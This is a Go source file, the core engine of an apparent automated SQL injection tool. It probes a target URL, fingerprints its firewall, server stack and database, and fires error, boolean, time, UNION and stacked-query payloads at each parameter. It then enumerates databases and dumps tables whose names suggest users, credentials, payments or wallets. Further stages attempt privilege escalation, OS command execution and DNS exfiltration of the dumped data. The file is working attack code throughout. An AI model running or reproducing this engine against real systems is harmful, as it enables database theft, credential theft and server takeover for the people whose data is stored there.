package core

import (
	"fmt"
	"hackit/sqli/go/modules"
	"hackit/sqli/go/payloads"
	"math"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"
)

type Result struct {
	Parameter  string  `json:"parameter"`
	Type       string  `json:"type"`
	Payload    string  `json:"payload"`
	DBMS       string  `json:"dbms"`
	Details    string  `json:"details"`
	Confidence float64 `json:"confidence"`
}

func (e *Engine) logInfo(msg string) {
	if e.Log != nil {
		e.Log.Info(msg)
	}
}

func (e *Engine) logWarn(msg string) {
	if e.Log != nil {
		e.Log.Warning(msg)
	}
}

func (e *Engine) logSuccess(msg string, args ...interface{}) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		formatted := msg
		if len(args) > 0 {
			formatted = fmt.Sprintf(msg, args...)
		}
		e.Log.Success(formatted)
	}
}

func (e *Engine) logVuln(msg string, args ...interface{}) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		formatted := fmt.Sprintf(msg, args...)
		e.Log.Success(formatted)
	}
}

func (e *Engine) logPayload(payload string, param string) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		e.Log.Payload(param, payload)
	}
}

func (e *Engine) Start() []Result {
	allResults := []Result{}

	u, err := url.Parse(e.Opts.URL)
	if err != nil {
		e.Log.Warning(fmt.Sprintf("could not parse target URL '%s'", e.Opts.URL))
		return []Result{{Parameter: "error", Type: "fatal", Payload: fmt.Sprintf("Invalid URL: %s", e.Opts.URL), DBMS: "", Confidence: 1.0, Details: "URL parse error"}}
	}

	params := u.Query()
	if len(params) == 0 && e.Opts.Data == "" {
		e.Log.Warning("no parameters found in URL or POST data")
		return []Result{{Parameter: "error", Type: "fatal", Payload: "No parameters found in URL or POST data", DBMS: "", Confidence: 1.0, Details: "The target URL has no query parameters and no POST data"}}
	}

	// ── Connection Phase ──
	e.Log.Info("testing connection to the target URL")
	var baseBody string
	var baseLen int
	var connected bool

	var baselineSamples []time.Duration

	// Connection retry with escalating timeout
	maxAttempts := 3
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		if attempt > 1 {
			e.Log.Warning(fmt.Sprintf("connection timed out, retry #%d with extended timeout (%ds)...", attempt-1, e.Opts.Timeout*2))
			e.Client.Timeout = time.Duration(e.Opts.Timeout*2) * time.Second
			time.Sleep(1 * time.Second)
		}

		var samples []time.Duration
		success := true
		for i := 0; i < 3; i++ {
			body, blen, _, err := e.Request("", "")
			if err != nil {
				success = false
				break
			}
			if i == 0 {
				baseBody = body
				baseLen = blen
			}
			samples = append(samples, e.LastResponseTime)
			time.Sleep(200 * time.Millisecond)
		}
		if success && len(samples) > 0 {
			baselineSamples = samples
			connected = true
			e.Log.Info(fmt.Sprintf("target URL content is stable (%d bytes, %v average response time)", baseLen, avgDuration(samples)))
			break
		}
	}

	if !connected {
		e.Log.Warning("connection timed out to the target URL")
		e.Log.Info("try: verifying the target URL is reachable from your network")
		e.Log.Info("try: using --proxy if behind a corporate firewall")
		e.Log.Info("try: increasing --timeout for slow connections")
		return []Result{{Parameter: "error", Type: "fatal", Payload: "Connection timed out", DBMS: "", Confidence: 1.0, Details: "Target URL is unreachable — check network, proxy, or increase timeout"}}
	}

	avgBaseTime := avgDuration(baselineSamples)

	// ── WAF Detection ──
	e.Log.Info("checking if the target is protected by some kind of WAF/IPS")
	waf := DetectWAF(e.LastResponseHeaders, baseBody)
	if waf.Detected {
		e.Log.Critical("heuristics detected that the target is protected by some kind of WAF/IPS")
		e.Log.Warning(fmt.Sprintf("WAF/IPS identified: %s", waf.Name))
		if e.Opts.BypassWAF {
			e.Log.Info("WAF bypass mode engaged — using evasion techniques")
		} else {
			e.Log.Warning("please consider usage of tamper scripts (option '--tamper')")
		}
	} else {
		e.Log.Info("no WAF/IPS detected")
	}

	e.Log.Blank()

	// ── Deep Backend Stack Detection ──
	backendStack := DetectBackendStack(e.LastResponseHeaders, baseBody)
	serverVer := DetectSoftwareVersion(e.LastResponseHeaders)
	if serverVer != "" {
		backendStack["Server Version"] = serverVer
	}
	osDetected := e.DetectOS()
	if osDetected != "Unknown" {
		backendStack["OS"] = osDetected
	}
	e.Log.BackendStack(backendStack)
	e.Log.Blank()

	// ── Initial DBMS Detection ──
	initialDB := DetectDBMS(baseBody, e.LastResponseHeaders)
	if initialDB != "Unknown" {
		e.Log.Success(fmt.Sprintf("heuristic (basic) test shows that GET parameter might be injectable (possible DBMS: '%s')", initialDB))
	} else {
		e.Log.Info("heuristic test: DBMS not identified — testing all 16 payload groups")
	}

	e.Log.Blank()

	// ── Parameter Testing ──
	paramName := firstParamName(params)
	e.Log.Info(fmt.Sprintf("testing for SQL injection on GET parameter '%s'", paramName))
	if initialDB != "Unknown" && initialDB != "" {
		e.Log.Info(fmt.Sprintf("it looks like the back-end DBMS is '%s'", initialDB))
	}
	e.Log.Blank()

	paramList := make([]string, 0, len(params))
	for p := range params {
		paramList = append(paramList, p)
	}

	var mu sync.Mutex
	sem := make(chan struct{}, e.Opts.Threads)
	var wg sync.WaitGroup

	for _, param := range paramList {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			paramResults := e.scanParameter(p, baseLen, avgBaseTime, initialDB, params)
			mu.Lock()
			allResults = append(allResults, paramResults...)
			mu.Unlock()
		}(param)
	}
	wg.Wait()

	allResults = deduplicateResults(allResults)
	sort.Slice(allResults, func(i, j int) bool {
		return allResults[i].Confidence > allResults[j].Confidence
	})

	e.Log.Blank()
	if len(allResults) > 0 {
		e.Log.Success(fmt.Sprintf("SQLi vulnerabilities found: %d", len(allResults)))
		for _, r := range allResults[:minInt(len(allResults), 3)] {
			e.Log.Success(fmt.Sprintf("Parameter '%s' is %s (DBMS: %s, confidence: %.0f%%)",
				r.Parameter, r.Type, r.DBMS, r.Confidence*100))
		}
		e.Log.Blank()
		backendStack := DetectBackendStack(e.LastResponseHeaders, baseBody)
		serverVer := DetectSoftwareVersion(e.LastResponseHeaders)
		if serverVer != "" {
			backendStack["Server Version"] = serverVer
		}
		e.Log.BackendStack(backendStack)
	} else {
		e.Log.Warning("No SQL injection vulnerabilities detected")
	}

	e.postScan(allResults, params)

	return allResults
}

func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Duration, initialDB string, params url.Values) []Result {
	results := []Result{}

	e.logInfo(fmt.Sprintf("testing '%s' parameter", param))

	// ── Stage 1a: Error-based ──
	if e.Opts.Mode == "auto" || e.Opts.Mode == "error" {
		dbmsFilter := initialDB
		if dbmsFilter == "" {
			dbmsFilter = "Unknown"
		}
		e.logInfo(fmt.Sprintf("testing 'AND/OR error-based - WHERE or HAVING clause' (%s)", dbmsFilter))
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}
			for _, pay := range group.Payloads {
				if pay.Type != "error" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)
				body, _, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				if isErrorInjection(body, group.DBMS) {
					e.logVuln(fmt.Sprintf("Parameter '%s' appears to be '%s error-based' injectable (DBMS: %s, confidence: 95%%)",
						param, group.DBMS, group.DBMS))
					results = append(results, Result{
						Parameter:  param,
						Type:       "Error-based",
						Payload:    processed,
						DBMS:       group.DBMS,
						Details:    fmt.Sprintf("%s error pattern detected", group.DBMS),
						Confidence: 0.95,
					})
					found = true
					break
				}
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if found {
				break
			}
		}
		if !found {
			e.logInfo("error-based injection: NOT vulnerable")
		}
	}

	// ── Stage 1b: Boolean-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "boolean") || e.Opts.RiskLevel >= 1 {
		e.logInfo("testing 'AND boolean-based blind - WHERE or HAVING clause'")
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}

			var truePayload, falsePayload string
			for _, pay := range group.Payloads {
				if pay.Type != "boolean" {
					continue
				}
				if pay.Expected == "true" && truePayload == "" {
					truePayload = pay.Content
				} else if pay.Expected == "false" && falsePayload == "" {
					falsePayload = pay.Content
				}
			}

			if truePayload == "" || falsePayload == "" {
				continue
			}

			processedTrue := e.ApplyTamper(truePayload)
			e.logPayload(processedTrue, param)
			trueBody, trueLen, _, err := e.Request(processedTrue, param)
			if err != nil {
				continue
			}
			_ = trueBody

			processedFalse := e.ApplyTamper(falsePayload)
			e.logPayload(processedFalse, param)
			falseBody, falseLen, _, err := e.Request(processedFalse, param)
			if err != nil {
				continue
			}
			_ = falseBody

			diffThreshold := 0.05
			trueSimilarToBase := float64(absInt(trueLen-baseLen)) < float64(baseLen)*diffThreshold
			falseDiffFromTrue := float64(absInt(trueLen-falseLen)) > float64(trueLen)*diffThreshold

			if trueSimilarToBase && falseDiffFromTrue {
				e.logVuln(fmt.Sprintf("Parameter '%s' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (DBMS: %s, confidence: 85%%)",
					param, group.DBMS))
				results = append(results, Result{
					Parameter:  param,
					Type:       "Boolean-based",
					Payload:    truePayload,
					DBMS:       group.DBMS,
					Details:    fmt.Sprintf("TRUE=%d, FALSE=%d, Base=%d", trueLen, falseLen, baseLen),
					Confidence: 0.85,
				})
				found = true
				break
			}
			if e.Opts.Delay > 0 {
				time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
			}
		}
		if !found {
			e.logInfo("boolean-based blind: NOT vulnerable")
		}
	}

	// ── Stage 1c: Time-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "time") || e.Opts.RiskLevel >= 1 {
		e.logInfo("testing 'AND time-based blind - WHERE or HAVING clause'")
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}
			for _, pay := range group.Payloads {
				if pay.Type != "time" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)

				timeSamples := []time.Duration{}
				for i := 0; i < 3; i++ {
					_, _, _, err := e.Request(processed, param)
					if err != nil {
						break
					}
					timeSamples = append(timeSamples, e.LastResponseTime)
				}
				if len(timeSamples) < 3 {
					continue
				}

				avgTime := avgDuration(timeSamples)
				if avgTime >= 2*time.Second {
					_, _, _, err := e.Request("", "")
					if err == nil {
						baseCheck := e.LastResponseTime
						ratio := float64(avgTime) / float64(baseCheck+1)
						if ratio >= 3.0 {
							confidence := math.Min(0.7+(ratio-3.0)*0.1, 0.99)
							e.logVuln(fmt.Sprintf("Parameter '%s' appears to be 'AND time-based blind' injectable (DBMS: %s, confidence: %.0f%%)",
								param, group.DBMS, confidence*100))
							results = append(results, Result{
								Parameter:  param,
								Type:       "Time-based",
								Payload:    processed,
								DBMS:       group.DBMS,
								Details:    fmt.Sprintf("Avg=%v, Base=%v, Ratio=%.1fx", avgTime, baseCheck, ratio),
								Confidence: confidence,
							})
							found = true
							break
						}
					}
				}
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if found {
				break
			}
		}
		if !found {
			e.logInfo("time-based blind: NOT vulnerable")
		}
	}

	// ── Stage 1d: Union-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "union") || e.Opts.RiskLevel >= 1 {
		e.logInfo("testing 'UNION query - ORDER BY column count'")
		colCount := 0
		commentUsed := "--"

		// Strategy 1: ORDER BY probe with multiple comment styles
		commentStyles := []string{"-- ", "--+", "--", "#", "/*", ";"}
	orderByLoop:
		for _, comment := range commentStyles {
			for cols := 1; cols <= 20; cols++ {
				pay := fmt.Sprintf("' ORDER BY %d %s", cols, comment)
				processed := e.ApplyTamper(pay)
				e.logPayload(processed, param)
				body, bodyLen, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				errKeywords := []string{"error", "order", "Unknown column", "syntax", "mysql_fetch", "unclosed",
					"MariaDB", "MySQL", "PostgreSQL", "SQLite", "SQL Server", "Incorrect"}
				isErr := false
				for _, kw := range errKeywords {
					if strings.Contains(strings.ToLower(body), kw) {
						isErr = true
						break
					}
				}
				if isErr || (bodyLen != 0 && bodyLen < baseLen-50) {
					colCount = cols - 1
					if colCount > 0 {
						e.logInfo(fmt.Sprintf("columns detected: %d (ORDER BY %d failed with '%s')", colCount, cols, comment))
						commentUsed = comment
						break orderByLoop
					}
				}
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if colCount > 0 {
				break
			}
		}

		// Strategy 2: NULL UNION probe if ORDER BY didn't work
		if colCount == 0 {
			unionComments := []string{"-- ", "--+", "--", "#", "/*", ";"}
		nullUnionLoop:
			for _, comment := range unionComments {
				for cols := 1; cols <= 12; cols++ {
					nulls := make([]string, cols)
					for i := range nulls {
						nulls[i] = "NULL"
					}
					for _, prefix := range []string{"' UNION SELECT ", "' UNION ALL SELECT ", " UNION SELECT ", "' UNION SELECT DISTINCT "} {
						pay := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls, ","), comment)
						processed := e.ApplyTamper(pay)
						e.logPayload(processed, param)
						_, bodyLen, _, err := e.Request(processed, param)
						if err != nil {
							continue
						}
						if bodyLen != baseLen {
							colCount = cols
							commentUsed = comment
							e.logInfo(fmt.Sprintf("columns detected via NULL union: %d (prefix: %s, comment: %s)", colCount, prefix, comment))
							break nullUnionLoop
						}
					}
					if e.Opts.Delay > 0 {
						time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
					}
				}
			}
		}

		// Strategy 3: GROUP BY / DISTINCT probe
		if colCount == 0 {
			e.logInfo("ORDER BY and UNION NULL failed, trying GROUP BY probe...")
			for cols := 1; cols <= 10; cols++ {
				nulls := make([]string, cols)
				for i := range nulls {
					nulls[i] = fmt.Sprintf("%d", i+1)
				}
				pay := fmt.Sprintf("' GROUP BY %s -- ", strings.Join(nulls, ","))
				processed := e.ApplyTamper(pay)
				e.logPayload(processed, param)
				body, bodyLen, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				if strings.Contains(strings.ToLower(body), "group") || bodyLen < baseLen-50 {
					colCount = cols
					commentUsed = "-- "
					e.logInfo(fmt.Sprintf("columns detected via GROUP BY: %d", colCount))
					break
				}
			}
		}

		if colCount > 0 {
			for _, prefix := range []string{"' UNION SELECT ", "' UNION ALL SELECT "} {
				nulls := make([]string, colCount)
				for i := range nulls {
					nulls[i] = "NULL"
				}
				unionPay := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls, ","), commentUsed)
				processed := e.ApplyTamper(unionPay)
				e.logPayload(processed, param)
				_, bodyLen, _, err := e.Request(processed, param)
				if err == nil && bodyLen != baseLen {
					e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
						param, initialDB, colCount))
					results = append(results, Result{
						Parameter:  param,
						Type:       "Union-based",
						Payload:    unionPay,
						DBMS:       initialDB,
						Details:    fmt.Sprintf("Columns: %d", colCount),
						Confidence: 0.80,
					})
					break
				} else if err == nil {
					// Try with different column count - the detected count might be off by one
					for offset := -1; offset <= 1; offset++ {
						adjusted := colCount + offset
						if adjusted < 1 || adjusted == colCount {
							continue
						}
						nulls2 := make([]string, adjusted)
						for i := range nulls2 {
							nulls2[i] = "NULL"
						}
						pay2 := fmt.Sprintf("%s%s %s", prefix, strings.Join(nulls2, ","), commentUsed)
						processed2 := e.ApplyTamper(pay2)
						e.logPayload(processed2, param)
						_, blen2, _, err2 := e.Request(processed2, param)
						if err2 == nil && blen2 != baseLen {
							e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
								param, initialDB, adjusted))
							results = append(results, Result{
								Parameter:  param,
								Type:       "Union-based",
								Payload:    pay2,
								DBMS:       initialDB,
								Details:    fmt.Sprintf("Columns: %d", adjusted),
								Confidence: 0.80,
							})
							colCount = adjusted
							break
						}
					}
				}
			}
		} else {
			e.logInfo("could not determine column count for UNION injection")
		}
	}

	// ── Stage 1e: Stacked Query ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "stacked") && (len(results) == 0 || e.Opts.RiskLevel >= 3) {
		e.logInfo("testing 'Stacked queries (SQL statement separation)'")
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				continue
			}
			for _, pay := range group.Payloads {
				if pay.Type != "stacked" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)
				body, bodyLen, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				_ = bodyLen
				if bodyLen != baseLen || isErrorInjection(body, group.DBMS) ||
					strings.Contains(body, "Query OK") || strings.Contains(body, "rows affected") {
					if bodyLen != baseLen {
						e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to Stacked queries (DBMS: %s, confidence: 85%%)",
							param, group.DBMS))
						results = append(results, Result{
							Parameter:  param,
							Type:       "Stacked query",
							Payload:    processed,
							DBMS:       group.DBMS,
							Details:    "Stacked query response differs from baseline",
							Confidence: 0.85,
						})
						break
					}
				}
			}
			if len(results) > 0 {
				break
			}
		}
		if len(results) == 0 {
			e.logInfo("stacked queries: NOT vulnerable")
		}
	}

	if len(results) > 0 {
		e.logSuccess(fmt.Sprintf("Parameter '%s' is vulnerable (found %d technique(s))", param, len(results)))
	} else {
		e.logWarn(fmt.Sprintf("Parameter '%s' does not appear to be injectable", param))
	}

	return results
}

func (e *Engine) postScan(results []Result, params url.Values) {
	if len(results) == 0 {
		e.logInfo("no vulnerabilities found — skipping enumeration")
		return
	}

	bestResult := results[0]
	param := bestResult.Parameter
	dbms := bestResult.DBMS

	e.logInfo(fmt.Sprintf("using parameter '%s' (DBMS: %s) for data extraction", param, dbms))

	enum := modules.NewEnumerator(e)

	var dbs []string
	doDBs := e.Opts.ListDBs || e.Opts.DumpAll || e.Opts.ListTables || e.Opts.ListColumns || e.Opts.Search != "" || e.Opts.Schema || e.Opts.DumpTable != ""
	if !doDBs {
		e.logInfo("skipping database enumeration (use --list-dbs or --dump-all to enable)")
		return
	}

	e.logInfo("fetching database names")
	var err error
	dbs, err = enum.ListDatabases(param, dbms)
	if err == nil {
		e.Log.ListDBHeader()
		for _, db := range dbs {
			e.Log.ListDB(db)
		}
		e.Log.Blank()
		results = append(results, Result{
			Parameter:  "enumeration",
			Type:       "list-dbs",
			Payload:    strings.Join(dbs, ","),
			DBMS:       dbms,
			Confidence: 1.0,
		})
	} else {
		e.logWarn(fmt.Sprintf("could not enumerate databases: %v", err))
		dbs = []string{getValue(params, param)}
	}

	// List tables for non-system databases
	if len(dbs) > 0 {
		for _, db := range dbs {
			if isSystemDB(db) && e.Opts.RiskLevel < 3 {
				continue
			}
			e.Log.Blank()
			e.Log.SectionHeader(fmt.Sprintf("AVAILABLE TABLE (%s)", db))
			tables, err := enum.ListTables(db, param, dbms)
			if err == nil && len(tables) > 0 {
				for _, t := range tables {
					e.Log.SectionItem(t)
				}
				results = append(results, Result{
					Parameter: "enumeration",
					Type:      "list-tables",
					Details:   db,
					Payload:   strings.Join(tables, ","),
					DBMS:      dbms,
					Confidence: 1.0,
				})

				for _, table := range tables {
					if isInterestingTable(table) || e.Opts.RiskLevel >= 3 {
						e.Log.Blank()
						e.Log.SectionHeader(fmt.Sprintf("COLUMNS (%s.%s)", db, table))
						cols, err := enum.ListColumns(db, table, param, dbms)
						if err == nil && len(cols) > 0 {
							for _, c := range cols {
								e.Log.SectionItem(c)
							}
							results = append(results, Result{
								Parameter: "enumeration",
								Type:      "list-columns",
								Details:   fmt.Sprintf("%s.%s", db, table),
								Payload:   strings.Join(cols, ","),
								DBMS:      dbms,
								Confidence: 1.0,
							})
							e.Log.Blank()
							e.Log.SectionHeader(fmt.Sprintf("DATA DUMP (%s.%s)", db, table))
							dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
							if len(dumped) > 0 {
								if rows, ok := dumped[table]; ok {
									for _, row := range rows {
										e.Log.SectionData(row)
									}
									e.Log.Blank()
									e.Log.Success(fmt.Sprintf("Total: %d row(s) from %s.%s", len(rows), db, table))
								}
								results = append(results, Result{
									Parameter: "enumeration",
									Type:      "dump-table",
									Details:   fmt.Sprintf("%s.%s", db, table),
									Payload:   fmt.Sprintf("%v", dumped[table]),
									DBMS:      dbms,
									Confidence: 1.0,
								})
							} else {
								e.Log.SectionData("(no data extracted)")
							}
						} else {
							e.Log.SectionData("(columns not found)")
						}
					}
				}
			} else if err != nil {
				e.Log.SectionData("(no tables found)")
			}
		}
	}

	if e.Opts.PrivEsc || e.Opts.OSAccess {
		e.logInfo("Post-Exploitation:")
		if e.Opts.PrivEsc {
			e.logInfo("attempting privilege escalation...")
			pe := e.PostExploit(param, dbms, "udf")
			if pe.Success {
				e.logSuccess(fmt.Sprintf("privilege escalation: %s", pe.Data))
			}
		}
		if e.Opts.OSAccess {
			e.logInfo("attempting OS command execution...")
			ce := e.PostExploit(param, dbms, "cmd_exec")
			if ce.Success {
				e.logSuccess(fmt.Sprintf("command output: %s", ce.Data))
			}
		}
	}

	if e.Opts.ExfilDNS || e.Opts.ExfilHTTP {
		e.logInfo("initiating out-of-band data exfiltration...")
		exfil := NewExfiltrator(e)
		for _, db := range dbs {
			tables, _ := enum.ListTables(db, param, dbms)
			for _, table := range tables {
				cols, _ := enum.ListColumns(db, table, param, dbms)
				if len(cols) > 0 {
					data := e.BulkExtract(param, dbms, db, []string{table}, cols)
					if len(data) > 0 {
						if e.Opts.ExfilDNS {
							exfil.Exfiltrate(param, dbms, fmt.Sprintf("%v", data))
						}
					}
				}
			}
		}
	}
}

// ── Helpers ──

func absInt(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func getValue(params url.Values, key string) string {
	v := params.Get(key)
	if v != "" {
		return v
	}
	return "current"
}

func firstParamName(params url.Values) string {
	for k := range params {
		return k
	}
	return "unknown"
}

func isSystemDB(name string) bool {
	sys := []string{"information_schema", "performance_schema", "mysql", "sys", "pg_catalog", "template0", "template1"}
	for _, s := range sys {
		if strings.EqualFold(name, s) {
			return true
		}
	}
	return false
}

func isInterestingTable(name string) bool {
	interesting := []string{"user", "admin", "account", "member", "staff", "credential", "customer", "client",
		"employee", "person", "profile", "login", "passwd", "secret", "token", "session",
		"api", "key", "config", "setting", "log", "audit", "payment", "order",
		"transaction", "wallet", "balance", "flag", "wp_users"}
	lower := strings.ToLower(name)
	for _, s := range interesting {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}

func (e *Engine) CheckError(body string, dbms string) bool {
	errorPatterns := []string{
		"SQL syntax", "mysql_fetch", "PostgreSQL", "ORA-",
		"Unclosed quotation mark", "syntax error at or near",
		"Microsoft OLE DB", "DB::Exception", "SQLite",
		"Driver.*SQL Server", "pg_query", "oci_", "PL/SQL",
	}
	for _, p := range errorPatterns {
		if strings.Contains(body, p) {
			return true
		}
	}
	return false
}

func isErrorInjection(body string, dbms string) bool {
	bodyLower := strings.ToLower(body)
	patterns := map[string][]string{
		"MySQL":      {"sql syntax", "mysql_fetch", "you have an error in your sql syntax", "warning: mysql", "mysql_error"},
		"MariaDB":    {"sql syntax", "mysql_fetch", "mariadb", "warning: mysql"},
		"MSSQL":      {"unclosed quotation mark", "microsoft ole db", "sql server", "driver.*sql server", "mssql_"},
		"PostgreSQL": {"postgresql", "pg_query", "syntax error at or near", "pg_", "division by zero"},
		"Oracle":     {"ora-", "oracle", "pls-", "oci_"},
		"SQLite":     {"sqlite", "sqlite3", "no such table", "no such column"},
		"ClickHouse": {"clickhouse", "db::exception", "received from clickhouse"},
		"DuckDB":     {"duckdb", "catalog error", "binder error"},
		"CockroachDB": {"cockroachdb", "runtime error", "crdb_"},
		"Snowflake":  {"snowflake", "execution error in"},
		"BigQuery":   {"bigquery", "unrecognized token"},
		"Firebird":   {"firebird", "dynamic sql error", "isc_"},
		"Sybase":     {"sybase", "sql anywhere"},
		"H2":         {"h2", "general error", "unique index or primary key violation"},
	}
	if pats, ok := patterns[dbms]; ok {
		for _, pat := range pats {
			if strings.Contains(bodyLower, pat) {
				return true
			}
		}
	}
	genericPats := []string{"sql syntax", "error in your sql", "unclosed quotation", "warning:"}
	for _, p := range genericPats {
		if strings.Contains(bodyLower, p) {
			return true
		}
	}
	return false
}

func (e *Engine) RandomizeCase(s string) string {
	result := ""
	for _, char := range s {
		if strings.Contains("abcdefghijklmnopqrstuvwxyz", strings.ToLower(string(char))) {
			if time.Now().UnixNano()%2 == 0 {
				result += strings.ToUpper(string(char))
			} else {
				result += strings.ToLower(string(char))
			}
		} else {
			result += string(char)
		}
	}
	return result
}

func avgDuration(durations []time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}
	var total time.Duration
	for _, d := range durations {
		total += d
	}
	return total / time.Duration(len(durations))
}

func stdDevDuration(durations []time.Duration, avg time.Duration) time.Duration {
	if len(durations) < 2 {
		return 0
	}
	var sumSquares float64
	avgNs := float64(avg.Nanoseconds())
	for _, d := range durations {
		diff := float64(d.Nanoseconds()) - avgNs
		sumSquares += diff * diff
	}
	variance := sumSquares / float64(len(durations)-1)
	return time.Duration(math.Sqrt(variance))
}

func deduplicateResults(results []Result) []Result {
	seen := make(map[string]bool)
	deduped := []Result{}
	for _, r := range results {
		key := r.Parameter + "|" + r.Type + "|" + r.DBMS
		if !seen[key] {
			seen[key] = true
			deduped = append(deduped, r)
		}
	}
	return deduped
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
